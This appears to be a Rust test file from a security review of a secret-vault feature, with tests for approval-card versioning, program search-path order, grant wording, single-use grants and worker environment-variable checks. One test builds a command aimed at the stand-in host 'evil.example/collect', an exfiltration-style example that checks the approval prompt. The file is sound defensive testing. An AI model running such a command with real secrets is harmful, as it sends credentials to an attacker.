//! Round-5 review repro (PR #213). Each test asserts the safe behaviour, so a failure is the finding. None of them is a
//! HIGH or CRITICAL finding; see the review report for the scenario behind each one.

use super::store::Memory;
use super::*;
use crate::session_store::SessionStore;

const VALUE: &str = "sk_live_51NxAbCdEfGhIjKl";
const NOW: i64 = 1_700_000_000_000;

struct Bench {
    store: SessionStore,
    vault: Memory,
}

impl Bench {
    fn new() -> Self {
        let bench = Self {
            store: SessionStore::open_in_memory().unwrap(),
            vault: Memory::new(),
        };
        let conn = bench.store.lock_conn().unwrap();
        save_value(
            &bench.vault,
            &conn,
            SCOPE_GLOBAL,
            "stripe-api-key",
            None,
            VALUE,
            NOW,
        )
        .unwrap();
        drop(conn);
        bench
    }
}

fn request(command: &[&str]) -> RunRequest {
    RunRequest {
        chat: "chat-1".into(),
        mono: Some("mono-1".into()),
        project: None,
        name: "stripe-api-key".into(),
        env: "STRIPE_API_KEY".into(),
        command: command.iter().map(|word| word.to_string()).collect(),
        cwd: None,
        timeout_seconds: None,
    }
}

fn waiting(outcome: RunOutcome) -> String {
    match outcome {
        RunOutcome::Waiting { decision_key, .. } => decision_key,
        other => panic!("expected a card, got {other:?}"),
    }
}

/// MEDIUM: a card that is put up again after its answer was spent starts from the same version number, so a tap made on
/// the older card (another window, or an Inbox that has not repainted) answers the newer command.
#[test]
fn a_version_read_on_a_spent_card_never_answers_the_card_put_up_after_it() {
    let bench = Bench::new();
    let mut conn = bench.store.lock_conn().unwrap();
    let key = waiting(
        prepare_run(
            &bench.vault,
            &mut conn,
            request(&[harmless_program(), "https://api.stripe.com/v1/balance"]),
            NOW,
        )
        .unwrap(),
    );
    let read = crate::decisions::get(&conn, "", &key)
        .unwrap()
        .unwrap()
        .version;
    crate::decisions::answer_seen(&mut conn, "", &key, "Once", None, Some(read), NOW + 1).unwrap();
    assert!(matches!(
        prepare_run(
            &bench.vault,
            &mut conn,
            request(&[harmless_program(), "https://api.stripe.com/v1/balance"]),
            NOW + 2,
        )
        .unwrap(),
        RunOutcome::Granted { .. }
    ));
    // The same program and variable with another address: the same card key, put up fresh.
    let again = waiting(
        prepare_run(
            &bench.vault,
            &mut conn,
            request(&[harmless_program(), "https://evil.example/collect"]),
            NOW + 3,
        )
        .unwrap(),
    );
    assert_eq!(again, key, "same program and variable, same card key");
    let card = crate::decisions::get(&conn, "", &key).unwrap().unwrap();
    assert!(card.question.contains("evil.example"), "{}", card.question);
    // A tap made on the first card carries the version that was read there.
    let stale =
        crate::decisions::answer_seen(&mut conn, "", &key, "Once", None, Some(read), NOW + 4);
    assert!(
        stale.is_err(),
        "a version read on the spent card (v{read}) answered the new card (v{}): {stale:?}",
        card.version
    );
    let still = crate::decisions::get(&conn, "", &key).unwrap().unwrap();
    assert_eq!(still.state, "open");
    assert!(matches!(
        prepare_run(
            &bench.vault,
            &mut conn,
            request(&[harmless_program(), "https://evil.example/collect"]),
            NOW + 5,
        )
        .unwrap(),
        RunOutcome::Waiting { .. }
    ));
}

/// MEDIUM: round 4 looked a bare program name up in the system folders first. Round 5 put connector launches back on the
/// Homebrew-first path, and the secret lookup still uses it, so `curl` resolves to a file in a folder the account (and
/// any agent running as it) can write before `/usr/bin/curl`.
#[cfg(unix)]
#[test]
fn a_bare_program_name_is_looked_up_in_the_system_folders_first() {
    let path = run::search_path();
    let first = std::env::split_paths(&path).next().expect("a search path");
    assert_eq!(
        first,
        std::path::Path::new("/usr/bin"),
        "secret programs are looked up on {path}"
    );
}

/// LOW: every answer except the exact word "No" is taken as "Once", so a lower-case "no" (or any other words) grants.
#[test]
fn only_the_word_once_grants_a_secret_run() {
    let bench = Bench::new();
    let mut conn = bench.store.lock_conn().unwrap();
    let key = waiting(
        prepare_run(
            &bench.vault,
            &mut conn,
            request(&[harmless_program(), "x"]),
            NOW,
        )
        .unwrap(),
    );
    let read = crate::decisions::get(&conn, "", &key)
        .unwrap()
        .unwrap()
        .version;
    crate::decisions::answer_seen(&mut conn, "", &key, "no", None, Some(read), NOW + 1).unwrap();
    let outcome = prepare_run(
        &bench.vault,
        &mut conn,
        request(&[harmless_program(), "x"]),
        NOW + 2,
    )
    .unwrap();
    assert!(
        !matches!(outcome, RunOutcome::Granted { .. }),
        "the answer \"no\" granted the run"
    );
}

/// LOW: a stored `once` grant is matched by `find_grant` and never spent, so it lets every later run of that command
/// through without a card. A `once` row is left behind when the app stops between `put_grant` and `spend_once`.
#[test]
fn a_stored_once_grant_lets_one_run_through_only() {
    let bench = Bench::new();
    let (program, identity) = pin_program(harmless_program(), None, None).unwrap();
    let command = vec![program.clone(), "customers".to_string()];
    let fingerprint = run_fingerprint(
        &program,
        &identity,
        "STRIPE_API_KEY",
        None,
        &command,
        TIMEOUT_DEFAULT,
    );
    let mut conn = bench.store.lock_conn().unwrap();
    conn.execute(
        "INSERT INTO secret_grants (scope, name, subject_kind, subject_id, executable, mode, created_at, identity, fingerprint)
         VALUES ('global', 'stripe-api-key', 'mono', 'mono-1', ?1, 'once', ?2, ?3, ?4)",
        rusqlite::params![program, NOW, identity, fingerprint],
    )
    .unwrap();
    let mut granted = 0;
    for at in 1..=3 {
        if matches!(
            prepare_run(
                &bench.vault,
                &mut conn,
                request(&[harmless_program(), "customers"]),
                NOW + at,
            )
            .unwrap(),
            RunOutcome::Granted { .. }
        ) {
            granted += 1;
        }
    }
    assert!(
        granted <= 1,
        "one stored once grant let {granted} runs through"
    );
}

/// LOW: a worker's variable name is checked only for its shape and the allow list, not with [`env_name_refusal`] as a
/// `secrets.run` is, and the worker card does not name it. The person approves "the Stripe key in its environment" and
/// the key lands in `NODE_OPTIONS` (or `ANTHROPIC_API_KEY`, which the worker CLI sends to its model provider).
#[test]
fn a_worker_cannot_put_a_key_in_a_variable_that_changes_how_its_cli_runs() {
    let bench = Bench::new();
    let mut conn = bench.store.lock_conn().unwrap();
    let outcome = worker::prepare(
        &bench.vault,
        &mut conn,
        worker::WorkerRequest {
            chat: "chat-1".into(),
            mono: "Tally".into(),
            project: None,
            executable: "claude".into(),
            secrets: vec![worker::WorkerSecret {
                name: "stripe-api-key".into(),
                env: "NODE_OPTIONS".into(),
            }],
        },
        NOW,
    );
    assert!(
        outcome.is_err(),
        "a worker was offered the key as NODE_OPTIONS: {outcome:?}"
    );
}
